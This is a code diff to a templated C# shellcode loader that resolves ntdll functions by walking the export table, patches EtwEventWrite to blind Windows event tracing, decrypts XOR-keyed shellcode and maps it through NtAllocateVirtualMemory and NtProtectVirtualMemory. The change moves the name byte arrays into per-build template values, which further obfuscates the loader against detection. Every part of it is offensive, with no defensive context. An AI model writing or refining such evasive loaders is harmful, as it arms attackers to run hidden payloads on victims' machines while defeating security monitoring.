@@ -39,6 +39,8 @@
                 return sb.ToString();
             }
 
+            static byte[] N(int[] c) { var b=new byte[c.Length+1]; for(int i=0;i<c.Length;i++) b[i]=(byte)c[i]; return b; }
+
             // Walk PE export table by name bytes — no plaintext function name strings.
             static IntPtr {{ v.fn_getexport }}(IntPtr mod, byte[] name) {
                 try {
@@ -76,12 +78,10 @@
 
             static void {{ v.fn_etw }}(IntPtr ntdll) {
                 try {
-                    // EtwEventWrite byte sequence (no plaintext string)
-                    byte[] tgt = new byte[]{69,116,119,69,118,101,110,116,87,114,105,116,101,0};
+                    byte[] tgt = N(new int[]{ {{ v.jsc_etw_event_write }} });
                     IntPtr fn  = {{ v.fn_getexport }}(ntdll, tgt);
                     if (fn == IntPtr.Zero) return;
-                    // NtProtectVirtualMemory byte sequence
-                    byte[] protN = new byte[]{78,116,80,114,111,116,101,99,116,86,105,114,116,117,97,108,77,101,109,111,114,121,0};
+                    byte[] protN = N(new int[]{ {{ v.jsc_nt_prot_vm }} });
                     IntPtr protAddr = {{ v.fn_getexport }}(ntdll, protN);
                     if (protAddr == IntPtr.Zero) return;
                     var NtProt = (NtProtFn)Marshal.GetDelegateForFunctionPointer(protAddr, typeof(NtProtFn));
@@ -132,7 +132,7 @@
                 IntPtr ntdll = IntPtr.Zero;
                 foreach (System.Diagnostics.ProcessModule m in
                          System.Diagnostics.Process.GetCurrentProcess().Modules)
-                    if (m.ModuleName.ToLower() == B(new int[]{110,116,100,108,108,46,100,108,108})) {
+                    if (m.ModuleName.ToLower() == B(new int[]{ {{ v.jsc_ntdll_dll }} })) {
                         ntdll = m.BaseAddress; break;
                     }
                 if (ntdll == IntPtr.Zero) return false;
@@ -145,9 +145,8 @@
                 for (int _ki = 0; _ki < _k.Length; _ki++) _k[_ki] ^= (byte){{ key_tweak }};
                 byte[] sc = {{ v.fn_decrypt }}({{ v.fn_hex }}({% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %}+{% endif %}{% endfor %}), _k);
 
-                // NtAllocateVirtualMemory + NtProtectVirtualMemory — no kernel32 IAT entries
-                byte[] allocN = new byte[]{78,116,65,108,108,111,99,97,116,101,86,105,114,116,117,97,108,77,101,109,111,114,121,0};
-                byte[] protN  = new byte[]{78,116,80,114,111,116,101,99,116,86,105,114,116,117,97,108,77,101,109,111,114,121,0};
+                byte[] allocN = N(new int[]{ {{ v.jsc_nt_alloc_vm }} });
+                byte[] protN  = N(new int[]{ {{ v.jsc_nt_prot_vm }} });
                 IntPtr allocAddr = {{ v.fn_getexport }}(ntdll, allocN);
                 IntPtr protAddr  = {{ v.fn_getexport }}(ntdll, protN);
                 if (allocAddr == IntPtr.Zero || protAddr == IntPtr.Zero) return false;
